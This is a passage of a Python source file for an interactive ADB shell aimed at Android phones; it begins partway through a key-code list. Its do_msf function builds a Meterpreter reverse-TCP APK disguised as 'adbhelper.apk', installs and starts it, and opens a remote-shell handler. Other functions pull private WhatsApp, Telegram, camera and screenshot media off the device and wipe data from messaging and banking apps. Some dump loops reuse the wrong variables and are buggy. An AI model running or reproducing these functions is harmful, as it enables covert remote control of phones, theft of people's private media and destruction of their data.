243  - KEYCODE_TV_INPUT_HDMI_1
244  - KEYCODE_TV_INPUT_HDMI_2
245  - KEYCODE_TV_INPUT_HDMI_3
246  - KEYCODE_TV_INPUT_HDMI_4
247  - KEYCODE_TV_INPUT_COMPOSITE_1
248  - KEYCODE_TV_INPUT_COMPOSITE_2
249  - KEYCODE_TV_INPUT_COMPONENT_1
250  - KEYCODE_TV_INPUT_COMPONENT_2
251  - KEYCODE_TV_INPUT_VGA_1
252  - KEYCODE_TV_AUDIO_DESCRIPTION
253  - KEYCODE_TV_AUDIO_DESCRIPTION_MIX_UP
254  - KEYCODE_TV_AUDIO_DESCRIPTION_MIX_DOWN
255  - KEYCODE_TV_ZOOM_MODE
256  - KEYCODE_TV_CONTENTS_MENU
257  - KEYCODE_TV_MEDIA_CONTEXT_MENU
258  - KEYCODE_TV_TIMER_PROGRAMMING
259  - KEYCODE_HELP
260  - KEYCODE_NAVIGATE_PREVIOUS
261  - KEYCODE_NAVIGATE_NEXT
262  - KEYCODE_NAVIGATE_IN
263  - KEYCODE_NAVIGATE_OUT
264  - KEYCODE_STEM_PRIMARY
265  - KEYCODE_STEM_1
266  - KEYCODE_STEM_2
267  - KEYCODE_STEM_3
268  - KEYCODE_DPAD_UP_LEFT
269  - KEYCODE_DPAD_DOWN_LEFT
270  - KEYCODE_DPAD_UP_RIGHT
271  - KEYCODE_DPAD_DOWN_RIGHT
272  - KEYCODE_MEDIA_SKIP_FORWARD
273  - KEYCODE_MEDIA_SKIP_BACKWARD
274  - KEYCODE_MEDIA_STEP_FORWARD
275  - KEYCODE_MEDIA_STEP_BACKWARD
276  - KEYCODE_SOFT_SLEEP
277  - KEYCODE_CUT
278  - KEYCODE_COPY
279  - KEYCODE_PASTE
280  - KEYCODE_SYSTEM_NAVIGATION_UP
281  - KEYCODE_SYSTEM_NAVIGATION_DOWN
282  - KEYCODE_SYSTEM_NAVIGATION_LEFT
283  - KEYCODE_SYSTEM_NAVIGATION_RIGHT
284  - KEYCODE_ALL_APPS
285  - KEYCODE_REFRESH
        """
        print(GREEN + key_events + RESET)

    def do_start_app(self, package_name):
        'Starts a package.'
        if not package_name:
            print(RED + "You must provide a package name." + RESET)
            return
        mainget = subprocess.run(f"adb shell dumpsys package {package_name} | grep -A 1 'MAIN'", shell=True, capture_output=True, text=True)
        string = str(mainget.stdout)
        searcher = string.find('/')
        grep = string[searcher:]
        grep2 = grep.find(' ')
        final_str = grep[:grep2].replace('/', '')
        run_adb_command(f"shell am start -n {package_name}/{final_str}")
    def do_dump_sd(self, arg):
        '''Dump device data. 
        '''
        mydevice = return_device()
        print("> Dumping data...")
        time.sleep(2)
        cmd = "adb shell ls /sdcard/Pictures/Screenshots/"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        encoder = str(result.stdout)
        for line in encoder.splitlines():
            print(f"> Dumping {line}!")
            run_adb_command(f"pull  /sdcard/Pictures/Screenshots/{line} adb-dumps/adb-{mydevice}")
        time.sleep(2)
        cmd = "adb shell ls /sdcard/Pictures/Telegram/"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        encoder = str(result.stdout)
        for line in encoder.splitlines():
            print(f"> Dumping {line}!")
            run_adb_command(f"pull /sdcard/Pictures/Telegram/{line} adb-dumps/adb-{mydevice}")
        cmd2 = "adb shell ls /sdcard/Pictures/WhatsApp/"
        result2 = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        encoder2 = str(result2.stdout)
        for line2 in encoder2.splitlines():
            print(f"> Dumping {line2}")
            run_adb_command(f"pull /sdcard/Pictures/WhatsApp/{line2} adb-dumps/adb-{mydevice}")
            ## new line babyyyyyyyyyyyyyyyyyy
        cmd3 = "adb shell ls /sdcard/DCIM/Camera/"
        result3 = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        encoder3 = str(result.stdout)
        for line3 in encoder3.splitlines():
            print(f"> Dumping {line}!")
            run_adb_command(f"pull /sdcard/DCIM/Camera/{line} adb-dumps/adb-{mydevice} ")
        print(f"{GREEN} Dump Finished! All files are saved in {RED}adb-dumps/{mydevice}{RESET}.")
    def do_dump_wha(self, arg):
        ''' TRY Dump whatsapp data. 
        usage: dump_wa <wpp type> (wa/whatsapp, w4b/whatsapp business)
        WARNING: depreciated! some functions could not work!
        '''
        mydevice = return_device()
        if not arg:
            print("This command need parameters (wa/w4b)")
        elif "w4b" in arg:
            print("> Dumping whatsapp data...")
            time.sleep(2)
            cmd = "adb shell ls /sdcard/Android/media/com.whatsapp.w4b/'WhatsApp\ Business'/Media/'WhatsApp\ Business\ Images'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            encoder = str(result.stdout)
            for line in encoder.splitlines():
                print(f"> Dumping {line}!")
                run_adb_command(f"pull /sdcard/Android/media/com.whatsapp.w4b/'WhatsApp\ Business'/Media/'WhatsApp\ Business\ Images'/{line} adb-dumps/adb-{mydevice}")
                if line == "Private" or line == "Sent":
                    pass
            time.sleep(2)
            cmd = "adb shell ls /sdcard/Android/media/com.whatsapp.w4b/'WhatsApp\ Business'/Media/'WhatsApp\ Business\ Video'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            encoder = str(result.stdout)
            for line in encoder.splitlines():
                print(f"> Dumping {line}!")
                run_adb_command(f"pull /sdcard/Android/media/com.whatsapp.w4b/'WhatsApp\ Business'/Media/'WhatsApp\ Business\ Video'/{line} adb-dumps/adb-{mydevice}")
                if line == "Private":
                    cmd2 = "adb shell ls /sdcard/Android/media/com.whatsapp.w4b/'WhatsApp\ Business'/Media/'WhatsApp\ Business\ Video'"
                    result2 = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    encoder2 = str(result2.stdout)
                    for line2 in encoder2.splitlines():
                        print(f"> Dumping {line2}")
                        run_adb_command(f"pull /sdcard/Android/media/com.whatsapp.w4b/'WhatsApp\ Business'/Media/'WhatsApp\ Business\ Video'/Private/{line2} adb-dumps/adb-{mydevice}")
            cmd6 = f"ls adb-dumps/adb-{mydevice}"
            resultt = subprocess.run(cmd6, shell=True, capture_output=True, text=True)
            encoderr = str(resultt.stdout)
            if "" in encoderr:
                print(f"{RED} FATAL ERROR{RESET}: PROBABLY YOU DONT HAVE ACCESS TO DUMP WPP DATA :(")
        elif "wa" in arg:
            print("> Dumping whatsapp data...")
            time.sleep(2)
            cmd = "adb shell ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media/'WhatsApp\ Images'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            encoder = str(result.stdout)
            for line in encoder.splitlines():
                print(f"> Dumping {line}!")
                run_adb_command(f"pull /sdcard/Android/media/com.whatsapp/WhatsApp/Media/'WhatsApp\ Images'/{line} adb-dumps/adb-{mydevice}")
                if line == "Private" or line == "Sent":
                    pass
            time.sleep(2)
            cmd = "adb shell ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media/'WhatsApp\ Video'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            encoder = str(result.stdout)
            for line in encoder.splitlines():
                print(f"> Dumping {line}!")
                run_adb_command(f"pull /sdcard/Android/media/com.whatsapp/WhatsApp/Media/'WhatsApp\ Video'/{line} adb-dumps/adb-{mydevice}")
                if line == "Private":
                    cmd2 = "adb shell ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media/'WhatsApp\ Video'/Private"
                    result2 = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    encoder2 = str(result2.stdout)
                    for line2 in encoder2.splitlines():
                        print(f"> Dumping {line2}")
                        run_adb_command(f"pull /sdcard/Android/media/com.whatsapp/WhatsApp/Media/'WhatsApp\ Video'/Private/{line2} adb-dumps/adb-{mydevice}")
            print(f"{GREEN} Dump Finished! All files are saved in {RED}adb-dumps/adb-{mydevice}{RESET}.")
            cmd6 = f"ls adb-dumps/adb-{mydevice}"
            resultt = subprocess.run(cmd6, shell=True, capture_output=True, text=True)
            encoderr = str(resultt.stdout)
            if "" in encoderr:
                print(f"{RED} FATAL ERROR{RESET}: PROBABLY YOU DONT HAVE ACCESS TO DUMP WPP DATA :(")
        else:
            print("Type help dump_wa plz.")
            pass
            

        
    def do_screencap(self, output_path):
        'Take a screenshot and save to <device_path>: screencap <path>'
        if not output_path:
            print(RED + "You must provide a path to save the screenshot." + RESET)
            return
        output_file = output_path if output_path.startswith("/") else f"/sdcard/{output_path}"
        run_adb_command(f"shell screencap -p '{output_file}'")
        print(GREEN + f"Screenshot saved at {output_file}" + RESET)

    # Command to record screen
    def do_screenrecord(self, output_path):
        'Records the device screen and saves to <device_path>: screenrecord <path>'
        if not output_path:
            print(RED + "You must provide a path to save the recording." + RESET)
            return
        print(GREEN + "Recording started, press Ctrl+C to stop..." + RESET)
        os.system(f"adb shell screenrecord '{output_path}'")
        print(GREEN + f"Screen recording saved at {output_path}" + RESET)

    def do_devices(self, arg):
        'List connected devices.'
        run_adb_command("devices")

    def do_msf(self, port):
        'Creates a simple payload for Android and opens a Meterpreter session.'
        if not port:
            print("Need the port!")
            return
        r = subprocess.run("hostname -I | cut -d' ' -f1", shell=True, capture_output=True, text=True)
        current = os.getcwd()
        ip = str(r.stdout)
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -R {current}/adbhelper.apk")
        os.system("echo use exploit/multi/handler >> batch.rc")
        os.system("echo set PAYLOAD android/meterpreter/reverse_tcp")
        os.system(f"echo set LHOST {ip} >> batch.rc")
        os.system(f"echo set LPORT {port} >> batch.rc")
        os.system("echo run >> batch.rc")
        run_adb_command(f"install adbhelper.apk")
        run_adb_command(f"adb shell am start -n com.metasploit.stage/com.metasploit.stage.MainActivity")
        os.system("msfconsole -r batch.rc")

    def do_list_pkgs(self, args):
        '''List packages on device.
        usage: list_pkgs or 
        list_pkgs search <YOUR STRING HERE>
        '''
        splitter = args.split()
        if "search" in args:
            if len(splitter) < 2:
                print("You need to set a string! ex: list_pkgs search termux")
                return
            elif len(splitter) == 2:
                result = subprocess.run("adb shell pm list packages", shell=True, capture_output=True, text=True)
                rencoder = str(result.stdout)
                rsplit = rencoder.splitlines()
                for line in rsplit:
                    if splitter[1] in line:
                        print(f"{GREEN}{line}{RESET}") 
            elif len(splitter) > 2:
                print("More then 2 args!")
                return
            else:
                pass
        else:
            run_adb_command("shell pm list packages")

    def do_clear_mstused(self, debug):
        'Clear the data of a list of most used packages.'
        if not debug:
            print("Yes or no option in debug mode is missing!")
            return
        elif "yes" in debug:
            run_adb_command("shell pm clear chat.simplex.app")
            run_adb_command("shell pm clear com.termux")
            run_adb_command("shell pm clear com.facebook.system")
            run_adb_command("shell pm clear com.drweb")
            run_adb_command("shell pm clear com.virtunum.android")
            run_adb_command("shell pm clear com.android.chrome")
            run_adb_command("shell pm clear com.tomatos.clientapp")
            run_adb_command("shell pm clear br.gov.caixa.tem")
            run_adb_command("shell pm clear com.tempmail")
            run_adb_command("shell pm clear com.instagram.android")
            run_adb_command("shell pm clear ru.zdevs.zarchiver")
            run_adb_command("shell pm clear com.whatsapp")
            run_adb_command("shell pm clear com.shazam.android")
            run_adb_command("shell pm clear com.alibaba.aliexpresshd")
            run_adb_command("shell pm clear com.whatsapp.w4b")
        else:
            print("Nothing to do.")
            return

    def do_clear_package(self, pkg_name):
        'Clear data of a package.'
        if not pkg_name:
            print("Please set a package name!")
            return
        run_adb_command(f"shell pm clear {pkg_name}")

    def do_install(self, apk_path):
        'Install an APK on the connected device: install <path_to_apk>'
        if not apk_path:
            print(RED + "You must provide a path for the APK." + RESET)
            return
        run_adb_command(f"install '{apk_path}'")

    def do_sysinf(self, sec):
        'Dump system information.'
        run_adb_command(f"shell dumpsys")

    def do_getpro(self, ned):
        'Get system properties.'
        run_adb_command(f"shell getprop")


    def do_uninstall(self, package_name):
        'Uninstall an application from the device: uninstall <package_name>'
        if not package_name:
            print(RED + "You must provide a package name." + RESET)
            return
        run_adb_command(f"uninstall {package_name}")

    def do_shell(self, arg):
        'Executes a command on the device shell: shell <command>'
        if not arg:
            print(RED + "You must provide a command to execute in the shell." + RESET)
            return
        run_adb_command(f"shell {arg}")

    def do_shell_terminal(self, arg):
         'Executes a shell on the target.'
         os.system("adb shell")

    def do_push(self, args):
        'Copies a file to the device: push <local_path> <device_path>'
        paths = args.split()
        if len(paths) < 2:
            print(RED + "You must provide a local path and a path on the device." + RESET)
            return
        local_path, remote_path = paths[0], paths[1]
        run_adb_command(f"push '{local_path}' '{remote_path}'")

    def do_pull(self, args):
        'Copies a file from the device: pull <device_path> <local_path>'
        paths = args.split()
        if len(paths) < 2:
            print(RED + "You must provide a path on the device and a local path." + RESET)
            return
        remote_path, local_path = paths[0], paths[1]
        run_adb_command(f"pull '{remote_path}' '{local_path}'")

    def do_logcat(self, arg):
        'Displays device logs: logcat'
        run_adb_command("logcat")
def test_dir():
    if os.path.exists("adbpayloads") == True:
        pass
    else:
        os.system("mkdir adbpayloads")
def test_dir2():
    if os.path.exists("adb-dumps") == True:
        pass
    else:
        os.system(f"mkdir adb-dumps")

def test_dir3():
    cmdto = "adb devices"
    result = subprocess.run(cmdto, shell=True, capture_output=True, text=True)
    splitter = str(result.stdout).splitlines()
    device2 = splitter[1].split()
    device = device2[0]
    resultado = re.findall("device", str(result.stdout))
    if len(str(result.stdout)) > 26:
        if len(resultado) == 2:
            if os.path.exists(f"adb-dumps/adb-{device}") == True:
                pass
            else:
                os.system(f"mkdir adb-dumps/adb-{device}")
        elif "unauthorized" in str(result.stdout):
            if os.path.exists(f"adb-dumps/adb-{device}") == True:
                pass
            else:
                os.system(f"mkdir adb-dumps/adb-{device}")
        else:
            pass
    else:
        pass
def check_dependencies():
    cmd = "cat /etc/os-release | grep ID="
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    encoder = str(r.stdout)
    if os.path.exists("/bin/adb") == True and os.path.exists("/bin/curl") == True:
        pass
    else:
        if "archlinux" in encoder:
            os.system("sudo pacman -S adb")
            os.system("sudo pacman -S curl")
        else:
            os.system("sudo apt -y install adb")
            os.system("sudo apt -y install curl")



parser = argparse.ArgumentParser(description="Choose.")
parser.add_argument('-n', '--number', type=int, help="1 Executes the script without device verification, 2 Executes the script with it, 3 without the animation.")
args = parser.parse_args()

if __name__ == "__main__":
    check_dependencies()
    test_dir()
    test_dir2()
    try:
        if args.number and args.number == 1:
            animation()
            MyTerminal().cmdloop()
        elif args.number and args.number == 2:
            test_dir3()
            animation()
            check_devices()
            MyTerminal().cmdloop()
        elif args.number and args.number == 3:
            MyTerminal().cmdloop()
        elif args.number and args.number != 2 and args.number != 1 and args.number != 3:
            print(f"Invalid Number: {args.number}") 
        else:
            print("Unknown error, something is missing.")
    except KeyboardInterrupt:
        print("\n Programm closed by user.")


    